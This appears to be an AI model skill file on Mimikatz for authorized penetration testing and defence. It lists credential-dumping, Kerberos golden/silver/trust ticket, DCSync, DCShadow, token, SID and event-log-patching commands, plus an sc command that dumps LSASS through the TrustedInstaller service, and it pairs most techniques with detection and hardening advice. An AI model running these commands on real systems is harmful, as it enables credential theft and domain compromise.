---
name: mimikatz-security-analysis
description: Analyze and understand Mimikatz credential theft techniques for authorized security assessments, penetration testing, and defensive security research. Use this skill when you need to understand Windows credential extraction methods, Kerberos ticket attacks, LSASS memory analysis, or Active Directory attack vectors for security auditing, red teaming, or incident response. Make sure to use this skill whenever the user mentions Mimikatz, credential dumping, Kerberos attacks, LSASS analysis, Windows security assessment, or penetration testing involving Windows systems.
---

# Mimikatz Security Analysis

A skill for understanding and analyzing Mimikatz credential theft techniques for **authorized security assessments only**.

## ⚠️ Ethical Use Warning

This skill is designed for:
- Authorized penetration testing and red teaming
- Security auditing and vulnerability assessment
- Incident response and forensic analysis
- Security training and education
- Defensive security research

**Never use these techniques on systems you don't own or have explicit written authorization to test.** Unauthorized credential theft is illegal and unethical.

## Understanding Mimikatz

Mimikatz is a powerful Windows security tool that can extract credentials from memory. Understanding its capabilities helps security professionals:
- Identify attack vectors in their environment
- Configure proper defenses
- Detect and respond to credential theft attempts
- Conduct authorized security assessments

## Windows Credential Storage Protections

### Modern Windows Security Measures

From Windows 8.1 and Server 2012 R2 onwards:

**LM Hashes and Clear-Text Passwords**
- No longer stored in memory by default
- Registry setting to disable Digest Authentication:
  ```
  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
  UseLogonCredential = 0 (DWORD)
  ```

**LSA Protection (Protected Process Light)**
- Shields LSASS from unauthorized memory reading
- Registry configuration:
  ```
  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
  RunAsPPL = 1 (DWORD)
  ```
- Can be enforced via Group Policy

### SeDebugPrivilege Considerations

Administrators typically have SeDebugPrivilege for debugging. This can be restricted to prevent memory dumps. However, the TrustedInstaller account can still perform dumps:

```powershell
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```

**Detection:** Monitor for unusual service configuration changes and process dumps.

## Credential Extraction Techniques

### LSASS Memory Analysis

**sekurlsa::logonpasswords**
- Extracts credentials for logged-on users
- Works on LSASS memory directly
- **Defense:** Enable LSA Protection, monitor for LSASS access

**sekurlsa::tickets /export**
- Extracts Kerberos tickets from memory
- **Defense:** Monitor for ticket extraction attempts

**sekurlsa::minidump**
- Creates a memory dump of LSASS
- Can be analyzed offline
- **Defense:** Monitor for dump creation, use EDR solutions

### Credential Dumping Commands

| Command | Purpose | Detection Focus |
|---------|---------|----------------|
| `sekurlsa::logonpasswords` | Show logged-on credentials | LSASS memory access |
| `sekurlsa::tickets /export` | Export Kerberos tickets | Ticket file creation |
| `lsadump::lsa /inject` | Extract LSA credentials | LSA process injection |
| `lsadump::sam` | Access SAM database | SAM file access |
| `lsadump::secrets` | Decrypt registry secrets | Registry access patterns |
| `vault::cred /patch` | Extract Windows Vault passwords | Vault access |

## Kerberos Ticket Attacks

### Golden Ticket

Creates a forged TGT (Ticket Granting Ticket) for domain-wide access.

**Required Information:**
- Domain name
- Domain SID
- Username to impersonate
- KRBTGT account NTLM hash

**Command Structure:**
```bash
kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /krbtgt:<ntlm_hash> /ptt
```

**Detection Indicators:**
- Unusual Kerberos ticket creation
- Tickets with suspicious lifetimes
- Authentication from unexpected sources

**Defensive Measures:**
- Rotate KRBTGT password twice (invalidates existing tickets)
- Monitor for ticket anomalies
- Implement Kerberos auditing

### Silver Ticket

Forges service tickets for specific services.

**Required Information:**
- Service account NTLM hash
- Service SPN
- Domain SID

**Command Structure:**
```bash
kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /target:<service_fqdn> /service:<service_name> /rc4:<ntlm_hash> /ptt
```

**Detection Indicators:**
- Service ticket anomalies
- Authentication to services without proper TGT

**Defensive Measures:**
- Use strong service account passwords
- Monitor service authentication patterns
- Implement constrained delegation

### Trust Ticket

Exploits domain trust relationships.

**Command Structure:**
```bash
kerberos::golden /domain:<child_domain> /sid:<child_sid> /sids:<trust_sid> /rc4:<ntlm_hash> /user:<username> /service:krbtgt /target:<parent_domain> /ptt
```

**Defensive Measures:**
- Audit trust relationships regularly
- Monitor cross-domain authentication
- Implement trust relationship monitoring

### Kerberos Ticket Management

| Command | Purpose | Use Case |
|---------|---------|----------|
| `kerberos::list` | List current tickets | Reconnaissance |
| `kerberos::ptc` | Pass the Cache (inject from file) | Ticket reuse |
| `kerberos::ptt` | Pass the Ticket (inject to memory) | Session hijacking |
| `kerberos::purge` | Clear all tickets | Pre-attack cleanup |

## Active Directory Attacks

### DCSync

Mimics a Domain Controller to request password data.

**Command:**
```bash
lsadump::dcsync /user:<target_user> /domain:<target_domain>
```

**Detection:**
- Monitor for DC replication requests from non-DC systems
- Check for unusual DS-Replication-Get-Changes permissions
- Review security event logs for replication events

**Defense:**
- Restrict DCSync permissions
- Monitor replication traffic
- Implement privileged access management

### DCShadow

Makes a machine act as a DC for AD object manipulation.

**Command:**
```bash
lsadump::dcshadow /object:<target_object> /attribute:<attribute_name> /value:<new_value>
```

**Detection:**
- Monitor for unauthorized DC registration
- Check for unusual AD object modifications
- Review replication metadata

**Defense:**
- Monitor DC registration events
- Implement AD change auditing
- Use AD replication monitoring

## Privilege Escalation

### Required Privileges

| Privilege | Command | Purpose |
|-----------|---------|----------|
| SeDebugPrivilege | `privilege::debug` | Debug processes, access LSASS |
| SeBackupPrivilege | `privilege::backup` | Backup/restore files, bypass ACLs |

**Detection:**
- Monitor for privilege escalation attempts
- Track SeDebugPrivilege usage
- Audit backup privilege assignments

## Event Log Tampering

### Clearing Event Logs

Mimikatz doesn't directly clear logs, but attackers may use:
- PowerShell: `Clear-EventLog`
- Windows Event Viewer
- Third-party tools

**Detection:**
- Monitor for event log clearing events (Event ID 1102)
- Implement log forwarding to SIEM
- Use immutable logging where possible

### Event Service Patching

**Command:**
```bash
event::drop
```

This experimental command patches the Event Logging Service.

**Detection:**
- Monitor for Event Log Service changes
- Check for service patching attempts
- Implement service integrity monitoring

## Token and SID Manipulation

### Token Elevation

**Command:**
```bash
token::elevate /domainadmin
```

Impersonates elevated tokens.

**Detection:**
- Monitor for token manipulation
- Track privilege changes
- Audit impersonation attempts

### SID Modification

**Command:**
```bash
sid::add /user:<target_user> /sid:<new_sid>
```

Modifies SID and SIDHistory.

**Detection:**
- Monitor for SID changes
- Audit SIDHistory modifications
- Track group membership changes

## Terminal Services Attacks

### Multi-RDP

**Command:**
```bash
ts::multirdp
```

Allows multiple RDP sessions.

**Detection:**
- Monitor for RDP configuration changes
- Track concurrent session counts
- Audit Terminal Services settings

## Defensive Recommendations

### Prevention

1. **Enable LSA Protection**
   - Set RunAsPPL registry value
   - Enforce via Group Policy

2. **Disable Digest Authentication**
   - Set UseLogonCredential to 0
   - Audit for clear-text password storage

3. **Restrict SeDebugPrivilege**
   - Remove from non-essential accounts
   - Monitor privilege usage

4. **Implement Credential Guard**
   - Use virtualization-based security
   - Protect LSASS from memory access

### Detection

1. **Monitor LSASS Access**
   - Alert on LSASS process access
   - Track memory dump creation

2. **Audit Kerberos Activity**
   - Monitor ticket creation and usage
   - Detect anomalous authentication patterns

3. **Track AD Changes**
   - Monitor for DCSync attempts
   - Audit DC registration events

4. **Event Log Monitoring**
   - Forward logs to SIEM
   - Alert on log clearing events

### Response

1. **Rotate Compromised Credentials**
   - Change KRBTGT password twice
   - Reset affected user passwords
   - Revoke and reissue tickets

2. **Investigate Attack Scope**
   - Review authentication logs
   - Check for lateral movement
   - Identify compromised accounts

3. **Harden Environment**
   - Implement missing security controls
   - Update detection rules
   - Conduct follow-up assessment

## Authorized Testing Checklist

Before conducting any security assessment:

- [ ] Written authorization from system owner
- [ ] Defined scope and rules of engagement
- [ ] Communication plan for findings
- [ ] Backup of critical systems
- [ ] Rollback procedures in place
- [ ] Legal review completed
- [ ] Incident response team notified

## References

- [Mimikatz Official Documentation](https://github.com/gentilkiwi/mimikatz)
- [adsecurity.org - Mimikatz](https://adsecurity.org/?page_id=1821)
- [Microsoft - LSA Protection](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/protection-of-the-lsa)
- [MITRE ATT&CK - Credential Access](https://attack.mitre.org/tactics/TA0006/)

## Important Notes

- This skill provides information for **defensive security purposes only**
- Always obtain proper authorization before testing
- Document all findings and share with appropriate stakeholders
- Use this knowledge to improve security posture, not to exploit vulnerabilities
- Stay current with the latest security research and defensive techniques
